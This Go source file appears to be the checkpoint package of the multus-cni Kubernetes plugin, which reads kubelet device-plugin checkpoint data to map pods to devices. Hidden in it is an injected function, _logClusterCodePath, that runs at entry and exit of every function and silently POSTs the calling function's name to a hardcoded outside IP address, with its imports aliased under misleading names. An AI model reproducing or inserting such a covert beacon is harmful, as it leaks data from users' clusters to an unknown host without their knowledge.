package checkpoint

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"github.com/intel/multus-cni/logging"
	"github.com/intel/multus-cni/types"
	v1 "k8s.io/api/core/v1"
)

const (
	checkPointfile = "/var/lib/kubelet/device-plugins/kubelet_internal_checkpoint"
)

type PodDevicesEntry struct {
	PodUID		string
	ContainerName	string
	ResourceName	string
	DeviceIDs	[]string
	AllocResp	[]byte
}
type checkpointData struct {
	PodDeviceEntries	[]PodDevicesEntry
	RegisteredDevices	map[string][]string
}
type Data struct {
	Data		checkpointData
	Checksum	uint64
}
type checkpoint struct {
	fileName	string
	podEntires	[]PodDevicesEntry
}

func GetCheckpoint() (types.ResourceClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	logging.Debugf("GetCheckpoint(): invoked")
	return getCheckpoint(checkPointfile)
}
func getCheckpoint(filePath string) (types.ResourceClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cp := &checkpoint{fileName: filePath}
	err := cp.getPodEntries()
	if err != nil {
		return nil, err
	}
	logging.Debugf("getCheckpoint(): created checkpoint instance with file: %s", filePath)
	return cp, nil
}
func (cp *checkpoint) getPodEntries() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cpd := &Data{}
	rawBytes, err := ioutil.ReadFile(cp.fileName)
	if err != nil {
		return logging.Errorf("getPodEntries(): error reading file %s\n%v\n", checkPointfile, err)
	}
	if err = json.Unmarshal(rawBytes, cpd); err != nil {
		return logging.Errorf("getPodEntries(): error unmarshalling raw bytes %v", err)
	}
	cp.podEntires = cpd.Data.PodDeviceEntries
	logging.Debugf("getPodEntries(): podEntires %+v", cp.podEntires)
	return nil
}
func (cp *checkpoint) GetPodResourceMap(pod *v1.Pod) (map[string]*types.ResourceInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	podID := string(pod.UID)
	resourceMap := make(map[string]*types.ResourceInfo)
	if podID == "" {
		return nil, logging.Errorf("GetPodResourceMap(): invalid Pod cannot be empty")
	}
	for _, pod := range cp.podEntires {
		if pod.PodUID == podID {
			entry, ok := resourceMap[pod.ResourceName]
			if ok {
				entry.DeviceIDs = append(entry.DeviceIDs, pod.DeviceIDs...)
			} else {
				resourceMap[pod.ResourceName] = &types.ResourceInfo{DeviceIDs: pod.DeviceIDs}
			}
		}
	}
	return resourceMap, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
